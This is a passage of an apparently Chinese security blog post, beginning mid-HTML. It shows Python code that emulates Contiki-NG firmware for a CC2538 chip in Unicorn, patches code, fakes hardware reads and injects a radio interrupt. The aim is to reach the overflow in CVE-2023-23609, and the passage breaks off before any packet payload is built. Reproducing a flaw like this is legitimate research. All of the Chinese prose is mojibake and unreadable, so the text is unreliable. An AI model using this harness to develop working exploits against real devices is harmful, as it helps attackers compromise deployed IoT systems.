</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span><span class="lnt">95
</span><span class="lnt">96
</span><span class="lnt">97
</span><span class="lnt">98
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">unicorn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">unicorn.arm_const</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>

<span class="kn">import</span> <span class="nn">random</span>

<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;arm&#39;</span>

<span class="n">REGION_START</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">REGION_SIZE</span> <span class="o">=</span> <span class="mh">0x60000000</span>
<span class="n">ROM_BASE</span> <span class="o">=</span> <span class="mh">0x202000</span>

<span class="k">def</span> <span class="nf">hook_code</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>        
    <span class="k">pass</span>

<span class="n">interrupted</span> <span class="o">=</span> <span class="kc">False</span>

<span class="k">def</span> <span class="nf">hook_block</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">interrupted</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[hook block] 0x</span><span class="si">{</span><span class="n">address</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">access</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">user_data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="c1"># interrupt </span>
    <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x203D5A</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">interrupted</span><span class="p">):</span>

        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Interrupted...&#34;</span><span class="p">)</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
        <span class="n">interrupted</span> <span class="o">=</span> <span class="kc">True</span>

        <span class="c1"># save registers</span>
        <span class="n">ptrs</span> <span class="o">=</span> <span class="p">{}</span>
        <span class="k">for</span> <span class="n">reg</span> <span class="ow">in</span> <span class="n">regs</span><span class="p">:</span>
            <span class="n">ptrs</span><span class="p">[</span><span class="n">reg</span><span class="p">]</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">reg</span><span class="p">)</span>
        <span class="n">pc</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_PC</span><span class="p">)</span>
            
        <span class="c1"># execute functions</span>
        <span class="n">interrupt_no</span> <span class="o">=</span> <span class="mi">2</span> <span class="c1"># reset</span>
        <span class="n">interrupt_func</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ROM_BASE</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="p">(</span><span class="n">interrupt_no</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">4</span><span class="p">))</span>
        <span class="n">mu</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">interrupt_func</span><span class="p">,</span> <span class="mh">0x00210768</span><span class="p">)</span>

        <span class="n">exit</span><span class="p">()</span>

        <span class="c1"># restore</span>
        <span class="k">for</span> <span class="n">reg</span> <span class="ow">in</span> <span class="n">regs</span><span class="p">:</span>
            <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">reg</span><span class="p">,</span> <span class="n">ptrs</span><span class="p">[</span><span class="n">reg</span><span class="p">])</span>    <span class="c1"># how to deal with stack?</span>
        <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">UC_ARM_REG_PC</span><span class="p">,</span> <span class="n">pc</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span>


    <span class="k">pass</span>
    

<span class="k">def</span> <span class="nf">hook_mem_unmapped</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[hook_mem_unmapped] </span><span class="si">{</span><span class="n">access</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">address</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">user_data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="k">pass</span>


<span class="k">def</span> <span class="nf">hook_mem_read</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
    <span class="c1"># print(f&#34;[hook_mem_read] {access}, {address:x}, {length}, {value}, {user_data}&#34;)</span>
    <span class="k">if</span> <span class="n">length</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x4000000</span><span class="p">])</span>   <span class="c1"># to bypass sys_ctrl_init, random_init</span>
        <span class="c1"># print(f&#34;content: {mu.mem_read(address, 4)}, ready to write random: {r}&#34;)</span>
        <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>


<span class="n">regs</span> <span class="o">=</span> <span class="p">[</span><span class="n">UC_ARM_REG_SP</span><span class="p">,</span> <span class="n">UC_ARM_REG_R0</span><span class="p">,</span> <span class="n">UC_ARM_REG_R1</span><span class="p">,</span> <span class="n">UC_ARM_REG_R2</span><span class="p">,</span> <span class="n">UC_ARM_REG_R3</span><span class="p">,</span> <span class="n">UC_ARM_REG_R12</span><span class="p">,</span> <span class="n">UC_ARM_REG_LR</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">mu</span> <span class="o">=</span> <span class="n">Uc</span><span class="p">(</span><span class="n">UC_ARCH_ARM</span><span class="p">,</span> <span class="n">UC_MODE_THUMB</span><span class="p">)</span>

    <span class="c1"># memory regions</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">REGION_START</span><span class="p">,</span> <span class="n">REGION_SIZE</span><span class="p">)</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="mh">0xe0000000</span><span class="p">,</span> <span class="mh">0x10000000</span><span class="p">)</span> <span class="c1"># NVIC</span>

    <span class="c1"># load ROM</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">ROM_BASE</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;hello-world.bin&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>

    <span class="c1"># write memory / patch code</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="mh">0x210926</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x70\xBD</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># bypass fade, POP {R4-R6,PC}</span>
    <span class="c1"># why not push pc, or mov pc,lr</span>

    <span class="c1"># init SP</span>
    <span class="n">init_sp</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ROM_BASE</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span>
    <span class="n">reset</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ROM_BASE</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">UC_ARM_REG_SP</span><span class="p">,</span> <span class="n">init_sp</span><span class="p">)</span>
    
    <span class="c1"># hooks</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_CODE</span><span class="p">,</span> <span class="n">hook_code</span><span class="p">)</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_BLOCK</span><span class="p">,</span> <span class="n">hook_block</span><span class="p">)</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_MEM_UNMAPPED</span><span class="p">,</span> <span class="n">hook_mem_unmapped</span><span class="p">)</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_MEM_READ</span><span class="p">,</span> <span class="n">hook_mem_read</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="mh">0x40000000</span><span class="p">,</span> <span class="mh">0x60000000</span><span class="p">)</span> <span class="c1"># MMIO read</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;reset:</span><span class="si">{</span><span class="n">reset</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="n">mu</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">reset</span><span class="p">,</span> <span class="mh">0x00210768</span><span class="p">)</span>

<span class="n">main</span><span class="p">()</span>

</code></pre></td></tr></table>
</div>
</div><p>åšå‡ ç‚¹è¯´æ˜ï¼š</p>
<ol>
<li>
<p>å‰é¢æåˆ° ARM Boot çš„æ—¶å€™ä» 0 åœ°å€å¤„è¯» SP å’Œ reset_handlerï¼Œé‚£æ˜¯çœŸæ­£çš„ç¡¬ä»¶å¤„ç†æµç¨‹ã€‚è½¯ä»¶æ¨¡æ‹Ÿæ—¶ï¼Œç›´æ¥æŠŠ raw åŠ è½½åˆ°åŸæœ¬çš„åœ°å€å¤„ï¼Œè‡³äº SP å’Œ reset_handler ç›´æ¥ä»è¿™ä¸ªåœ°å€å¤„è¯»å°±è¡Œäº†ã€‚</p>
</li>
<li>
<p>hook_code æ˜¯æ¯”è¾ƒå¥½çš„è°ƒè¯•æ‰‹æ®µï¼Œé€šè¿‡æ‰“å°ä¿¡æ¯å¯ä»¥çœ‹åˆ°æ¨¡æ‹Ÿè¿‡ç¨‹ã€‚</p>
</li>
<li>
<p>ç”±äºæœ‰ä¸€éƒ¨åˆ†ä»£ç ä¼šå¾ªç¯ç­‰å¾…ç¡¬ä»¶çš„å€¼ï¼Œæ‰€ä»¥è¦ä¹ˆæŠŠé‚£éƒ¨åˆ†ä»£ç  patch æ‰ï¼Œè¦ä¹ˆ hook_mem_read æ¥æ”¹å˜ MMIOï¼ˆç›¸å½“äºä»ç¡¬ä»¶è¾“å…¥å€¼ï¼‰ã€‚</p>
</li>
<li>
<p>ä¸­æ–­åœ¨ hook_block ä¸­å¼•å…¥ã€‚ç”±äºæ¨¡æ‹Ÿçš„æ˜¯ resetï¼Œä¸ºäº†é¿å…ä¸€ç›´å¾ªç¯æ‰§è¡Œæˆ‘ä»¬åªå¼•å…¥ä¸€æ¬¡ä¸­æ–­ã€‚æ‰€ä»¥æ•´ä¸ªæƒ³è¦æ¨¡æ‹Ÿçš„è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼šboot -&gt; reset_handler -&gt; main -&gt; ä¸­æ–­ -&gt; reset_handler -&gt; main -&gt; æ¨¡æ‹Ÿç»“æŸ exitã€‚å¯ä»¥åˆ©ç”¨ hook_code æ‰“å°åœ°å€ä¿¡æ¯çœ‹çœ‹æ¨¡æ‹Ÿçš„æ˜¯ä¸æ˜¯è¿™ä¸ªè¿‡ç¨‹ã€‚</p>
</li>
</ol>
<h4 id="è§¦å‘æ›´å¤šä¸­æ–­å¤ç°-cve-2023-23609">è§¦å‘æ›´å¤šä¸­æ–­ï¼Œå¤ç° CVE-2023-23609</h4>
<p>ä¸‹é¢æˆ‘ä»¬æ¥åšç‚¹æ›´æœ‰æ„æ€çš„äº‹æƒ…ï¼šæ¨¡æ‹Ÿæ›´å¤šçš„ä¸­æ–­æ¥æ‰§è¡Œåˆ° <a href="https://github.com/contiki-ng/contiki-ng/security/advisories/GHSA-qr4q-6h3m-h3g7" target="_blank" rel="noopener noreffer">CVE-2023-23609</a> çš„æ¼æ´ä»£ç ï¼Œå¹¶æ„é€ ä¸­æ–­æ•°æ®å¤ç°æ¼æ´ã€‚å¯ä»¥çœ‹åˆ°æ¼æ´ patch å‡ºç°åœ¨ <code>input_l2cap_frame_flow_channel</code> ä¸­ï¼Œå¤§æ¦‚æ˜¯ç¼ºå°‘ä¸€ä¸ªé•¿åº¦æ£€æµ‹ï¼Œå¯¼è‡´ç´§æ¥ç€çš„ memcpy å‡ºç°è¶Šç•Œã€‚æŸ¥çœ‹ binary ä¸­è¿™ä¸ªæ¼æ´å‡½æ•°å‘ç°ç¡®å®æ²¡æœ‰è¢« patchã€‚</p>
<h6 id="å¦‚ä½•èµ°åˆ°æ¼æ´å‡½æ•°">å¦‚ä½•èµ°åˆ°æ¼æ´å‡½æ•°</h6>
<p>å¤§æ¦‚çŒœæµ‹è¿™æ˜¯ä¸€ä¸ªç½‘ç»œåŒ…å¤„ç†å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—è¿›ä¸€æ­¥åˆ†æç½‘å¡ç›¸å…³å‡½æ•°ã€‚ä¸­æ–­è¡¨ä¸­çš„ <code>pka_isr</code> å’Œ <code>cc2538_rf_rx_tx_isr</code> çœ‹ä¸Šå»ç›¸å½“ç›¸å…³ã€‚</p>
<p><code>cc2538_rf_rx_tx_isr</code> çœ‹ä¸Šå»æ˜¯ poll ä¸€ä¸ªè¿›ç¨‹ç„¶åä¿®æ”¹å¯„å­˜å™¨ã€‚è¿™ä¸ªè¿›ç¨‹çš„å…¥å£ç‚¹åœ¨ <code>process_thread_cc2538_rf_process</code>ï¼Œè¿™ä¸ªå‡½æ•°çœ‹ä¸Šå»å°±æ˜¯ä¸ªæ”¶åŒ…å‡½æ•°ï¼Œæ¥æ”¶åˆ°ç¡¬ä»¶ä¼ æ¥çš„åŒ…ä»¥åï¼Œç»è¿‡ä¸€ç³»åˆ—çš„æ ¡éªŒå¹¶è°ƒç”¨ <code>input</code> å‡½æ•°ï¼Œè€Œ <code>input</code> å°±èƒ½è§¦å‘æ¼æ´å‡½æ•°ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">cc2538_rf_rx_tx_isr</span><span class="p">()</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">poll_mode</span> <span class="p">)</span>
    <span class="n">process_poll</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cc2538_rf_process</span><span class="p">);</span>
  <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x40088834</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>å¥½ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬å°è¯•è§¦å‘ä¸­æ–­å‡½æ•° <code>cc2538_rf_rx_tx_isr</code>ï¼Œä¸­æ–­å· 158. æ³¨å…¥ä¸­æ–­çš„ä»£ç åŸºæœ¬å¯ä»¥ç…§æ¬ä¸Šéƒ¨åˆ†ï¼Œå¾ˆæ˜¾ç„¶ä¸­æ–­æ¢å¤<a href="https://developer.arm.com/documentation/ddi0403/d/System-Level-Architecture/System-Level-Programmers--Model/ARMv7-M-exception-model/Exception-entry-behavior" target="_blank" rel="noopener noreffer">ç»†èŠ‚</a>å¾ˆå¤šï¼Œè¿œè¿œæ¯”è¿™æ®µä»£ç ç®€å•ï¼Œä½†æ˜¯ç›®å‰æš‚æ—¶èƒ½ç”¨å°±è¡Œã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">hook_block</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
  <span class="k">global</span> <span class="n">interrupted</span>

  <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[hook block] 0x</span><span class="si">{</span><span class="n">address</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">access</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">user_data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

  <span class="c1"># interrupt </span>
  <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x203D5A</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">interrupted</span><span class="p">):</span>

      <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Interrupted...&#34;</span><span class="p">)</span>
      <span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
      <span class="c1"># interrupted = True</span>
      <span class="n">interrupted</span> <span class="o">=</span> <span class="kc">True</span>

      <span class="c1"># save registers</span>
      <span class="n">ptrs</span> <span class="o">=</span> <span class="p">{}</span>
      <span class="k">for</span> <span class="n">reg</span> <span class="ow">in</span> <span class="n">regs</span><span class="p">:</span>
          <span class="n">ptrs</span><span class="p">[</span><span class="n">reg</span><span class="p">]</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">reg</span><span class="p">)</span>
      <span class="n">pc</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_PC</span><span class="p">)</span>
          
      <span class="c1"># execute functions</span>
      <span class="n">interrupt_no</span> <span class="o">=</span> <span class="mi">158</span>
      <span class="n">interrupt_func</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ROM_BASE</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="p">(</span><span class="n">interrupt_no</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">4</span><span class="p">))</span>
      <span class="n">mu</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">interrupt_func</span><span class="p">,</span> <span class="mh">0x203B1C</span><span class="p">)</span>

      <span class="c1"># restore</span>
      <span class="k">for</span> <span class="n">reg</span> <span class="ow">in</span> <span class="n">regs</span><span class="p">:</span>
          <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">reg</span><span class="p">,</span> <span class="n">ptrs</span><span class="p">[</span><span class="n">reg</span><span class="p">])</span>    <span class="c1"># how to deal with stack?</span>
      <span class="c1"># mu.reg_write(UC_ARM_REG_PC, pc)</span>

      <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ok&#34;</span><span class="p">)</span>

      <span class="c1"># mu.emu_start(0x203D5A, 0x00210768)</span>

      <span class="n">exit</span><span class="p">()</span>

  <span class="k">pass</span>
</code></pre></td></tr></table>
</div>
</div><p>ç„¶åå‘ç°å°±å¯ä»¥èµ°åˆ° <code>cc2538_rf_rx_tx_isr</code> å‡½æ•°äº†ï¼Œå¹¶è§¦å‘äº†ä» MMIO è¯»å–ç½‘å¡æ•°æ®åŒ…çš„ <code>read</code> å‡½æ•°ã€‚æˆ‘ä»¬æŒ‰ç…§ MMIO pattern å°±å¯ä»¥æ„é€ ç½‘ç»œåŒ…äº†ï¼šå…ˆå‘ 0x40088828 åœ°å€å¤„å¡ 4 å­—èŠ‚è¡¨ç¤ºé•¿åº¦ï¼Œç„¶åæ¯æ¬¡å‘ 0x40088828 åœ°å€å¤„å¡<strong>ä¸€ä¸ª</strong>å­—èŠ‚ä½œä¸ºæ•°æ®ã€‚è¿™é‡Œä¹Ÿå¯ä»¥å‘ç° <code>bufsize</code> å®šæ­»ä¸º 0x80ï¼Œä¸ºæˆ‘ä»¬åç»­çš„åˆ©ç”¨å¢æ·»äº†ä¸å°‘éº»çƒ¦ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">read</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="n">bufsize</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// r0
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// r3
</span><span class="c1"></span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">bufsize</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x40088828</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="n">bufsize</span> <span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x40088828</span><span class="p">];</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int16</span><span class="p">)</span><span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">result</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">)</span>
    <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x40088828</span><span class="p">];</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>å¥½ï¼Œæˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹ <code>hook_mem_read</code> æ¥æ¨¡æ‹Ÿç¡¬ä»¶è¡Œä¸ºï¼Œéšä¾¿å¡ç‚¹ä»€ä¹ˆåˆ° MMIOã€‚ç„¶åä¿®æ”¹ <code>hook_code</code> åœ¨ <code>input</code> å‡½æ•°å¼€å§‹æ—¶éªŒè¯ä¸€ä¸‹æ•°æ®æœ‰æ²¡æœ‰æˆåŠŸè¾“å…¥ã€‚ç»“æœæ˜¾ç¤ºæˆåŠŸäº†ï¼</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">data_ptr</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">data_len</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">def</span> <span class="nf">hook_code</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">data_len</span><span class="p">,</span> <span class="n">data_ptr</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202DBA</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202DBA: get_channel_for_cid, l2cap_channel_count &#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R0</span><span class="p">),</span> <span class="n">u8</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="mh">0x20002D76</span><span class="p">,</span> <span class="mi">1</span><span class="p">)))</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202D9C</span><span class="p">):</span>
        <span class="n">data_ptr</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R0</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202D9C: packetbuf_dataptr &#34;</span><span class="p">,</span> <span class="n">data_ptr</span><span class="p">)</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202DA2</span><span class="p">):</span>
        <span class="n">data_len</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R0</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202DA2: packetbuf_datalen &#34;</span><span class="p">,</span> <span class="n">data_len</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;data: &#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">data_ptr</span><span class="p">,</span> <span class="n">data_len</span><span class="p">))</span>

<span class="n">packet_injected</span> <span class="o">=</span> <span class="mi">0</span>

<span class="c1"># memory pattern</span>
